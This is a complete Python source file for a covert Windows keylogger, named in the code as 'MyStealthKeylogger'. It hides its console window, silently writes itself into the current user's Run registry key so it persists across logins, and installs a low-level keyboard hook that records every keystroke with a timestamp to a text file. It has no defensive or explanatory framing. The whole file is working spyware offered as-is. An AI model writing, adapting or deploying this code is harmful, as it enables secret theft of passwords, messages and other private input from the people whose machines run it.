import os
import sys
import ctypes
import ctypes.wintypes
import time
import datetime
import winreg

# Constants
WH_KEYBOARD_LL = 13
WM_KEYDOWN = 0x0100

# Load libraries
user32 = ctypes.windll.user32
kernel32 = ctypes.windll.kernel32

# Define KBDLLHOOKSTRUCT structure
class KBDLLHOOKSTRUCT(ctypes.Structure):
    _fields_ = [
        ("vkCode", ctypes.wintypes.DWORD),
        ("scanCode", ctypes.wintypes.DWORD),
        ("flags", ctypes.wintypes.DWORD),
        ("time", ctypes.wintypes.DWORD),
        ("dwExtraInfo", ctypes.wintypes.ULONG_PTR),
    ]

# Function to hide the console window
def hide_console():
    """Hide the console window."""
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

# Function to add the script to Windows startup
def add_to_startup():
    """Add the script to Windows startup."""
    script_path = os.path.abspath(sys.argv[0])
    key = winreg.HKEY_CURRENT_USER
    key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
    try:
        with winreg.OpenKey(key, key_path, 0, winreg.KEY_WRITE) as reg_key:
            winreg.SetValueEx(reg_key, "MyStealthKeylogger", 0, winreg.REG_SZ, script_path)
    except Exception as e:
        pass  # Fail silently

# Function to get the name of the key from the virtual key code
def get_key_name(virtual_key):
    scan_code = user32.MapVirtualKeyW(virtual_key, 0)  # Convert virtual key to scan code
    char = ctypes.create_unicode_buffer(32)
    user32.GetKeyNameTextW(scan_code << 16, char, 32)  # Get key name from scan code
    return char.value

# Low-level keyboard hook procedure
def low_level_keyboard_procedure(nCode, wParam, lParam):
    if nCode >= 0 and wParam == WM_KEYDOWN:
        # Dereference lParam to access the KBDLLHOOKSTRUCT
        kb_struct = ctypes.cast(lParam, ctypes.POINTER(KBDLLHOOKSTRUCT)).contents
        virtual_key_code = kb_struct.vkCode

        # Get the current timestamp
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        # Get the key name
        key = get_key_name(virtual_key_code)

        # Log the key press
        with open("keylog.txt", "a") as log_file:
            log_file.write(f"[{timestamp}] Key Pressed: {key}\n")

    # Pass the event to the next hook
    return user32.CallNextHookEx(None, nCode, wParam, lParam)

# Define the HOOKPROC function type
HOOKPROC = ctypes.WINFUNCTYPE(ctypes.wintypes.LPARAM, ctypes.wintypes.INT, ctypes.wintypes.WPARAM, ctypes.wintypes.LPARAM)
keyboard_proc = HOOKPROC(low_level_keyboard_procedure)

# Main function
def main():
    # Hide the console window
    hide_console()

    # Add the script to Windows startup
    add_to_startup()

    # Install the low-level keyboard hook
    hHook = user32.SetWindowsHookExW(WH_KEYBOARD_LL, keyboard_proc, kernel32.GetModuleHandleW(None), 0)

    if not hHook:
        ctypes.windll.user32.MessageBoxW(0, "Failed to install hook!", "Error", 0x10)
        sys.exit(1)

    try:
        # Message loop to keep the hook active
        msg = ctypes.wintypes.MSG()
        while user32.GetMessageW(ctypes.byref(msg), None, 0, 0) > 0:
            user32.TranslateMessage(ctypes.byref(msg))
            user32.DispatchMessageW(ctypes.byref(msg))
            time.sleep(0.01)  # Reduce CPU usage
    finally:
        # Unhook the keyboard hook
        user32.UnhookWindowsHookEx(hHook)

if __name__ == "__main__":
    main()